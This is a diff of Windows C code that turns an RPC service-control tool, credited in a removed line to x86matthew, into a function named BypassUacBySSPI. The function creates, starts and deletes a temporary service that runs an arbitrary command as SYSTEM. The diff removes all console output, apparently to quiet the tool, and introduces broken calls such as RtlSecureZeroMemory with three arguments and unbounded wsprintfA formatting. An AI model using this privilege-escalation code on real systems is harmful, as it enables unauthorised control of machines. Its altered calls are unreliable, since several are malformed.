@@ -243,7 +243,7 @@ DWORD RpcBind(struct RpcConnectionStruct* pRpcConnection, char* pInterfaceUUID, 
 	DWORD dwSecondaryAddrAlign = 0;
 
 	// set base header details
-	memset((void*)&RpcBaseHeader, 0, sizeof(RpcBaseHeader));
+	SecureZeroMemory((void*)&RpcBaseHeader, sizeof(RpcBaseHeader));
 	RpcBaseHeader.wVersion = 5;
 	RpcBaseHeader.bPacketType = 11;
 	RpcBaseHeader.bPacketFlags = 3;
@@ -253,7 +253,7 @@ DWORD RpcBind(struct RpcConnectionStruct* pRpcConnection, char* pInterfaceUUID, 
 	RpcBaseHeader.dwCallIndex = pRpcConnection->dwCallIndex;
 
 	// set bind request header details
-	memset((void*)&RpcBindRequestHeader, 0, sizeof(RpcBindRequestHeader));
+	SecureZeroMemory((void*)&RpcBindRequestHeader, sizeof(RpcBindRequestHeader));
 	RpcBindRequestHeader.wMaxSendFrag = MAX_RPC_PACKET_LENGTH;
 	RpcBindRequestHeader.wMaxRecvFrag = MAX_RPC_PACKET_LENGTH;
 	RpcBindRequestHeader.dwAssocGroup = 0;
@@ -291,7 +291,7 @@ DWORD RpcBind(struct RpcConnectionStruct* pRpcConnection, char* pInterfaceUUID, 
 	pRpcConnection->dwCallIndex++;
 
 	// get bind response
-	memset((void*)&bResponseData, 0, sizeof(bResponseData));
+	SecureZeroMemory((void*)&bResponseData, sizeof(bResponseData));
 	if (ReadFile(pRpcConnection->hFile, (void*)bResponseData, sizeof(bResponseData), &dwBytesRead, NULL) == 0)
 	{
 		return 1;
@@ -359,8 +359,8 @@ DWORD RpcConnect(char* pPipeName, char* pInterfaceUUID, DWORD dwInterfaceVersion
 	struct RpcConnectionStruct RpcConnection;
 
 	// set pipe path
-	memset(szPipePath, 0, sizeof(szPipePath));
-	_snprintf(szPipePath, sizeof(szPipePath) - 1, "\\\\.\\pipe\\%s", pPipeName);
+	RtlSecureZeroMemory(szPipePath, 0, sizeof(szPipePath));
+	wsprintfA(szPipePath, "\\\\.\\pipe\\%s", pPipeName);
 
 	// open rpc pipe
 	hFile = CreateFileA(szPipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
@@ -370,7 +370,7 @@ DWORD RpcConnect(char* pPipeName, char* pInterfaceUUID, DWORD dwInterfaceVersion
 	}
 
 	// initialise rpc connection data
-	memset((void*)&RpcConnection, 0, sizeof(RpcConnection));
+	RtlSecureZeroMemory((void*)&RpcConnection, 0, sizeof(RpcConnection));
 	RpcConnection.hFile = hFile;
 	RpcConnection.dwCallIndex = 1;
 
@@ -414,7 +414,7 @@ DWORD RpcSendRequest(struct RpcConnectionStruct* pRpcConnection, DWORD dwProcedu
 	}
 
 	// set base header details
-	memset((void*)&RpcBaseHeader, 0, sizeof(RpcBaseHeader));
+	RtlSecureZeroMemory((void*)&RpcBaseHeader, sizeof(RpcBaseHeader));
 	RpcBaseHeader.wVersion = 5;
 	RpcBaseHeader.bPacketType = 0;
 	RpcBaseHeader.bPacketFlags = 3;
@@ -424,7 +424,7 @@ DWORD RpcSendRequest(struct RpcConnectionStruct* pRpcConnection, DWORD dwProcedu
 	RpcBaseHeader.dwCallIndex = pRpcConnection->dwCallIndex;
 
 	// set request header details
-	memset((void*)&RpcRequestHeader, 0, sizeof(RpcRequestHeader));
+	RtlSecureZeroMemory((void*)&RpcRequestHeader, sizeof(RpcRequestHeader));
 	RpcRequestHeader.dwAllocHint = 0;
 	RpcRequestHeader.wContextID = 0;
 	RpcRequestHeader.wProcedureNumber = (WORD)dwProcedureNumber;
@@ -451,7 +451,7 @@ DWORD RpcSendRequest(struct RpcConnectionStruct* pRpcConnection, DWORD dwProcedu
 	pRpcConnection->dwCallIndex++;
 
 	// get bind response
-	memset((void*)&bResponseData, 0, sizeof(bResponseData));
+	RtlSecureZeroMemory((void*)&bResponseData, sizeof(bResponseData));
 	if (ReadFile(pRpcConnection->hFile, (void*)bResponseData, sizeof(bResponseData), &dwBytesRead, NULL) == 0)
 	{
 		return 1;
@@ -507,9 +507,9 @@ DWORD RpcSendRequest(struct RpcConnectionStruct* pRpcConnection, DWORD dwProcedu
 DWORD RpcInitialiseRequestData(struct RpcConnectionStruct* pRpcConnection)
 {
 	// initialise request data
-	memset(pRpcConnection->bProcedureInputData, 0, sizeof(pRpcConnection->bProcedureInputData));
+	RtlSecureZeroMemory(pRpcConnection->bProcedureInputData, sizeof(pRpcConnection->bProcedureInputData));
 	pRpcConnection->dwProcedureInputDataLength = 0;
-	memset(pRpcConnection->bProcedureOutputData, 0, sizeof(pRpcConnection->bProcedureOutputData));
+	RtlSecureZeroMemory(pRpcConnection->bProcedureOutputData, sizeof(pRpcConnection->bProcedureOutputData));
 	pRpcConnection->dwProcedureOutputDataLength = 0;
 
 	// reset input error flag
@@ -582,12 +582,8 @@ int BypassUacBySSPI(int argc, char* argv[])
 	DWORD dwServiceCommandLineLength = 0;
 	char* pExecCmd = NULL;
 
-	printf("CreateSvcRpc - www.x86matthew.com\n\n");
-
 	if (argc != 2)
 	{
-		printf("Usage: %s [exec_cmd]\n\n", argv[0]);
-
 		return 1;
 	}
 
@@ -595,26 +591,20 @@ int BypassUacBySSPI(int argc, char* argv[])
 	pExecCmd = argv[1];
 
 	// generate a temporary service name
-	memset(szServiceName, 0, sizeof(szServiceName));
-	_snprintf(szServiceName, sizeof(szServiceName) - 1, "CreateSvcRpc_%u", GetTickCount());
+	RtlSecureZeroMemory(szServiceName, sizeof(szServiceName));
+	wsprintfA(szServiceName, "CreateSvcRpc_%u", GetTickCount());
 	dwServiceNameLength = strlen(szServiceName) + 1;
 
 	// set service command line
-	memset(szServiceCommandLine, 0, sizeof(szServiceCommandLine));
-	_snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1, "cmd /c start %s", pExecCmd);
+	RtlSecureZeroMemory(szServiceCommandLine, sizeof(szServiceCommandLine));
+	wsprintfA(szServiceCommandLine, "cmd /c start %s", pExecCmd);
 	dwServiceCommandLineLength = strlen(szServiceCommandLine) + 1;
-
-	printf("Connecting to SVCCTL RPC pipe...\n");
 
 	// open SVCCTL v2.0
 	if (RpcConnect("ntsvcs", "367abb81-9844-35f1-ad32-98f038001003", 2, &RpcConnection) != 0)
 	{
-		printf("Failed to connect to RPC pipe\n");
-
 		return 1;
 	}
-
-	printf("Opening service manager...\n");
 
 	// OpenSCManager
 	RpcInitialiseRequestData(&RpcConnection);
@@ -644,8 +634,6 @@ int BypassUacBySSPI(int argc, char* argv[])
 	// check return value
 	if (dwReturnValue != 0)
 	{
-		printf("OpenSCManager error: %u\n", dwReturnValue);
-
 		// error
 		RpcDisconnect(&RpcConnection);
 
@@ -654,8 +642,6 @@ int BypassUacBySSPI(int argc, char* argv[])
 
 	// store service manager object
 	memcpy(bServiceManagerObject, (void*)&RpcConnection.bProcedureOutputData[0], sizeof(bServiceManagerObject));
-
-	printf("Creating temporary service...\n");
 
 	// CreateService
 	RpcInitialiseRequestData(&RpcConnection);
@@ -703,8 +689,6 @@ int BypassUacBySSPI(int argc, char* argv[])
 	// check return value
 	if (dwReturnValue != 0)
 	{
-		printf("CreateService error: %u\n", dwReturnValue);
-
 		// error
 		RpcDisconnect(&RpcConnection);
 
@@ -713,8 +697,6 @@ int BypassUacBySSPI(int argc, char* argv[])
 
 	// store service object
 	memcpy(bServiceObject, (void*)&RpcConnection.bProcedureOutputData[4], sizeof(bServiceObject));
-
-	printf("Executing '%s' as SYSTEM user...\n", pExecCmd);
 
 	// StartService
 	RpcInitialiseRequestData(&RpcConnection);
@@ -744,15 +726,11 @@ int BypassUacBySSPI(int argc, char* argv[])
 	// check return value
 	if (dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT)
 	{
-		printf("StartService error: %u\n", dwReturnValue);
-
 		// error
 		RpcDisconnect(&RpcConnection);
 
 		return 1;
 	}
-
-	printf("Deleting temporary service...\n");
 
 	// DeleteService
 	RpcInitialiseRequestData(&RpcConnection);
@@ -780,15 +758,11 @@ int BypassUacBySSPI(int argc, char* argv[])
 	// check return value
 	if (dwReturnValue != 0)
 	{
-		printf("DeleteService error: %u\n", dwReturnValue);
-
 		// error
 		RpcDisconnect(&RpcConnection);
 
 		return 1;
 	}
-
-	printf("Finished\n");
 
 	// disconnect from rpc pipe
 	if (RpcDisconnect(&RpcConnection) != 0)
